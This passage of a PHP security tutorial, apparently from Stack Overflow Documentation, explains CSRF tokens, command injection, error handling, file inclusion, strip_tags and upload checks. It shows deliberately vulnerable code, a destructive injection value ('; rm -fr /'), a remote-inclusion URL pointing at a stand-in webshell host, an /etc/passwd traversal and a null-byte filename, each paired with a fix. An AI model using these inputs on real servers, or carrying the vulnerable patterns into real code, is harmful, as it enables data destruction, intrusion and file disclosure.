double-quoted-string">&quot;0&quot;</span><span class="token operator">&gt;</span>

</code></pre></div><p>the account would be deleted.</p> <h3 id="solution-2"><a href="#solution-2" class="header-anchor">#</a> Solution</h3> <p>A common solution to this problem is the use of <strong>CSRF tokens</strong>. CSRF tokens are embedded into requests so that a web application can trust that a request came from an expected source as part of the application's normal workflow.  First the user performs some action, such as viewing a form, that triggers the creation of a unique token. A sample form implementing this might look like</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string double-quoted-string">&quot;get&quot;</span> action<span class="token operator">=</span><span class="token string double-quoted-string">&quot;/delete.php&quot;</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">&quot;text&quot;</span> name<span class="token operator">=</span><span class="token string double-quoted-string">&quot;accnt&quot;</span> placeholder<span class="token operator">=</span><span class="token string double-quoted-string">&quot;accnt number&quot;</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">&quot;hidden&quot;</span> name<span class="token operator">=</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span> value<span class="token operator">=</span><span class="token string double-quoted-string">&quot;&lt;randomToken&gt;&quot;</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">&quot;submit&quot;</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>

</code></pre></div><p>The token can then be validated by the server against the user session after form submission to eliminate malicious requests.</p> <h3 id="sample-code"><a href="#sample-code" class="header-anchor">#</a> Sample code</h3> <p>Here is sample code for a basic implementation:</p> <div class="language-php extra-class"><pre class="language-php"><code>/* Code to generate a CSRF token and store the same */
...
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">function</span> <span class="token function-definition function">generate_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Check if a token is present for the current session</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// No token present, generate a new one</span>
        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Reuse the token</span>
        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/delete.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>accnt<span class="token punctuation">&quot;</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>accnt number<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>csrf_token<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">generate_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
...


/* Code to validate token and drop malicious requests */
...
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Reset token</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;csrf_token&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;CSRF token validation failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
...

</code></pre></div><p>There are many libraries and frameworks already available which have their own implementation of CSRF validation. Though this is the simple implementation of CSRF, You need to write some code to <strong>regenerate</strong> your CSRF token dynamically to prevent from CSRF token stealing and fixation.</p> <h2 id="command-line-injection"><a href="#command-line-injection" class="header-anchor">#</a> Command Line Injection</h2> <h3 id="problem-3"><a href="#problem-3" class="header-anchor">#</a> Problem</h3> <p>In a similar way that SQL injection allows an attacker to execute arbitrary queries on a database, command-line injection allows someone to run untrusted system commands on a web server.  With an improperly secured server this would give an attacker complete control over a system.</p> <p>Let's say, for example, a script allows a user to list directory contents on a web server.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls '</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>

</code></pre></div><p><strong>(In a real-world application one would use PHP's built-in functions or objects to get path contents. This example is for a simple security demonstration.)</strong></p> <p>One would hope to get a <code>path</code> parameter similar to <code>/tmp</code>.  But as any input is allowed, <code>path</code> could be <code>; rm -fr /</code>.  The web server would then execute the command</p> <div class="language-php extra-class"><pre class="language-php"><code>ls<span class="token punctuation">;</span> rm <span class="token operator">-</span>fr <span class="token operator">/</span>

</code></pre></div><p>and attempt to delete all files from the root of the server.</p> <h3 id="solution-3"><a href="#solution-3" class="header-anchor">#</a> Solution</h3> <p>All command arguments must be <strong>escaped</strong> using <code>escapeshellarg()</code> or <code>escapeshellcmd()</code>. This makes the arguments non-executable.  For each parameter, the input value should also be <strong>validated</strong>.</p> <p>In the simplest case, we can secure our example with</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls '</span> <span class="token operator">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>

</code></pre></div><p>Following the previous example with the attempt to remove files, the executed command becomes</p> <div class="language-php extra-class"><pre class="language-php"><code>ls <span class="token string single-quoted-string">'; rm -fr /'</span>

</code></pre></div><p>And the string is simply passed as a parameter to <code>ls</code>, rather than terminating the <code>ls</code> command and running <code>rm</code>.</p> <p>It should be noted that the example above is now secure from command injection, but not from directory traversal. To fix this, it should be checked that the normalized path starts with the desired sub-directory.</p> <p>PHP offers a variety of functions to execute system commands, including <code>exec</code>, <code>passthru</code>, <code>proc_open</code>, <code>shell_exec</code>, and <code>system</code>.  All must have their inputs carefully validated and escaped.</p> <h2 id="error-reporting"><a href="#error-reporting" class="header-anchor">#</a> Error Reporting</h2> <p>By default PHP will output <strong>errors</strong>, <strong>warnings</strong> and <strong>notice</strong> messages directly on the page if something unexpected in a script occurs. This is useful for resolving specific issues with a script but at the same time it outputs information you don't want your users to know.</p> <p>Therefore it's good practice to avoid displaying those messages which will reveal information about your server, like your directory tree for example, in production environments.  In a development or testing environment these messages may still be useful to display for debugging purposes.</p> <h3 id="a-quick-solution"><a href="#a-quick-solution" class="header-anchor">#</a> A quick solution</h3> <p>You can turn them off so the messages don't show at all, however this makes debugging your script harder.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;display_errors&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre></div><p>Or change them directly in the <strong>php.ini</strong>.</p> <div class="language-php extra-class"><pre class="language-php"><code>display_errors <span class="token operator">=</span> <span class="token number">0</span>

</code></pre></div><h3 id="handling-errors"><a href="#handling-errors" class="header-anchor">#</a> Handling errors</h3> <p>A better option would be to store those error messages to a place they are more useful, like a database:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$errno</span> <span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">try</span><span class="token punctuation">{</span>
    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;mysql:host=hostname;dbname=databasename&quot;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dbuser'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dbpwd'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span> <span class="token operator">=&gt;</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;INSERT INTO `errors` (no,msg,file,line) VALUES (?,?,?,?)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to execute query'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to prepare query'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Exception: '</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token variable">$errfile</span></span>:<span class="token interpolation"><span class="token variable">$errline</span></span>:<span class="token interpolation"><span class="token variable">$errno</span></span> | <span class="token interpolation"><span class="token variable">$errstr</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p>This method will log the messages to the database and if that fails to a file instead of echoing it directly into the page. This way you can track what users are experiencing on your website and notify you immediately if something go's wrong.</p> <h2 id="file-inclusion"><a href="#file-inclusion" class="header-anchor">#</a> File Inclusion</h2> <h3 id="remote-file-inclusion"><a href="#remote-file-inclusion" class="header-anchor">#</a> Remote File Inclusion</h3> <p>Remote File Inclusion (also known as RFI) is a type of vulnerability that allows an attacker to include a remote file.</p> <p>This example injects a remotely hosted file containing a malicious code:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

</span></code></pre></div><blockquote></blockquote> <p>/vulnerable.php?page=<a href="http://evil.example.com/webshell.txt" target="_blank" rel="noopener noreferrer">http://evil.example.com/webshell.txt<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>?</p> <h3 id="local-file-inclusion"><a href="#local-file-inclusion" class="header-anchor">#</a> Local File Inclusion</h3> <p>Local File Inclusion (also known as LFI) is the process of including files on a server through the web browser.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pages/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token variable">$page</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</span></code></pre></div><blockquote></blockquote> <p>/vulnerable.php?page=../../../../etc/passwd</p> <h3 id="solution-to-rfi-lfi"><a href="#solution-to-rfi-lfi" class="header-anchor">#</a> Solution to RFI &amp; LFI:</h3> <p>It is recommended to only allow including files you approved, and limit to those only.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pages/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>
<span class="token variable">$allowed</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'pages/home.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pages/error.php'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span><span class="token variable">$allowed</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</span></code></pre></div><h2 id="stripping-tags"><a href="#stripping-tags" class="header-anchor">#</a> Stripping Tags</h2> <p><a href="http://php.net/manual/en/function.strip-tags.php" target="_blank" rel="noopener noreferrer"><code>strip_tags</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> is a very powerful function if you know how to use it. As a method to prevent <a href="http://stackoverflow.com/documentation/php/2781/security/11883/cross-site-scripting-xss#t=201704202055152207702" target="_blank" rel="noopener noreferrer">cross-site scripting attacks<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> there are better methods, such as character encoding, but stripping tags is useful in some cases.</p> <h3 id="basic-example"><a href="#basic-example" class="header-anchor">#</a> Basic Example</h3> <div class="language-php extra-class"><pre class="language-php"><code><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;b&gt;Hello,&lt;&gt; please remove the &lt;&gt; tags.&lt;/b&gt;'</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p><strong>Raw Output</strong></p> <div class="language-php extra-class"><pre class="language-php"><code>Hello<span class="token punctuation">,</span> please remove the tags<span class="token operator">.</span>

</code></pre></div><h3 id="allowing-tags"><a href="#allowing-tags" class="header-anchor">#</a> Allowing Tags</h3> <p>Say you wanted to allow a certain tag but no other tags, then you'd specify that in the second parameter of the function. This parameter is optional. In my case I only want the <code>&lt;b&gt;</code> tag to be passed through.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;b&gt;Hello,&lt;&gt; please remove the &lt;br&gt; tags.&lt;/b&gt;'</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;b&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p><strong>Raw Output</strong></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">&lt;</span>b<span class="token operator">&gt;</span>Hello<span class="token punctuation">,</span> please remove the  tags<span class="token operator">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>b<span class="token operator">&gt;</span>

</code></pre></div><h3 id="notice-s"><a href="#notice-s" class="header-anchor">#</a> Notice(s)</h3> <p><code>HTML</code> comments and <code>PHP</code> tags are also stripped. This is hardcoded and can not be changed with allowable_tags.</p> <p>In <code>PHP</code> 5.3.4 and later, self-closing <code>XHTML</code> tags are ignored and only non-self-closing tags should be used in allowable_tags. For example, to allow both <code>&lt;br&gt;</code> and <code>&lt;br/&gt;</code>, you should use:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre></div><h2 id="uploading-files"><a href="#uploading-files" class="header-anchor">#</a> Uploading files</h2> <p>If you want users to upload files to your server you need to do a couple of security checks before you actually move the uploaded file to your web directory.</p> <h3 id="the-uploaded-data"><a href="#the-uploaded-data" class="header-anchor">#</a> The uploaded data:</h3> <p>This array contains <strong><strong>user</strong></strong> <strong>submitted data</strong> and is <strong>not</strong> information about the file itself. While usually this data is generated by the browser one can easily make a post request to the same form using software.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

</code></pre></div><ul><li><code>name</code> - Verify every aspect of it.</li> <li><code>type</code> - Never use this data. It can be fetched by using PHP functions instead.</li> <li><code>size</code> - Safe to use.</li> <li><code>tmp_name</code> - Safe to use.</li></ul> <h3 id="exploiting-the-file-name"><a href="#exploiting-the-file-name" class="header-anchor">#</a> Exploiting the file name</h3> <p>Normally the operating system does not allow specific characters in a file name, but by spoofing the request you can add them allowing for unexpected things to happen. For example, lets name the file:<br><br> <code>../script.php%00.png</code><br><br>Take good look at that filename and you should notice a couple of things.</p> <ol><li>The first to notice is the <code>../</code>, fully illegal in a file name and at the same time perfectly fine if you are moving a file from 1 directory to another, which we're gonna do right?</li> <li>Now you might think you were verifying the file extensions properly in your script but this exploit relies on the url decoding, translating <code>%00</code> to a <code>null</code> character, basically saying to the operating system, this string ends here, stripping off <code>.png</code> off the filename.</li></ol> <p>So now I've uploaded <code>script.php</code> to another directory, by-passing simple validations to file extensions. It also by-passes <code>.htaccess</code> files disallowing scripts to be executed from within your upload directory.</p> <h3 id="getting-the-file-name-and-extension-safely"><a href="#getting-the-file-name-and-extension-safely" class="header-anchor">#</a> Getting the file name and extension safely</h3> <p>You can use <a href="http://php.net/manual/en/function.pathinfo.php" target="_blank" rel="noopener noreferrer"><code>pathinfo()</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> to extrapolate the name and extension in a safe manner but first we need to replace unwanted characters in the file name:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token comment">// This array contains a list of characters not allowed in a filename</span>
<span class="token variable">$illegal</span>   <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'chr'</span><span class="token punctuation">,</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;:&quot;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&quot;'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;\\&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;|&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;?&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;*&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$illegal</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;-&quot;</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$pathinfo</span>  <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
